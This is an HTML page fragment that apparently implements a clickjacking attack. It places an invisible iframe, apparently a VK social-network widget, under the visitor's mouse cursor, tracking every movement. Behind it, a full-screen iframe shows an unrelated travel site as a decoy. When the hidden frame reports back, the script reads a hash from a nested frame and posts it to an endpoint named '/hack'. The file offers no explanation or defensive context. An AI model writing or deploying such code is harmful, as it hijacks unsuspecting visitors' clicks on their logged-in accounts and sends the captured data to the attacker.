</head>
<body>
  <div id="vkframe" style="position:absolute;z-index:3;">
    <iframe src="/frame.html" style="height:27px; width:89px; overflow-y: hidden; opacity:0;"  scrolling="no" seamless></iframe>
  </div>
  <iframe seamless src="http://www.wherethehellismatt.com/" style="position:absolute; top:0px;width:100%;height:100%;" scrolling="no"></iframe>
  <div id="overlay" style="width:100%;height:100%;position:absolute;top:0px;left:0px;z-index:2;"></div>
  <script type="text/javascript">
    if (detectBrowser().current == "chrome" || detectBrowser().current == "safari" || detectBrowser().current == "mobile-safari") {
      $(document).bind('mousemove', function(e){
        $('#vkframe').css({
           left:  e.pageX - 50,
           top:   e.pageY - 16
        });
      });
      $(window).on('message', function(e){
        if (frames[0].frames[0].location.hash){
          $("#vkframe").hide();
          $("#overlay").hide();
          $.post("/hack", {hash:frames[0].frames[0].location.hash})
        }
      });
    } else {
      $("#vkframe").hide();
      $("#overlay").hide();
    }
    setTimeout(function(){
      $("#vkframe").hide();
      $("#overlay").hide();
    }, 10000);
  </script>
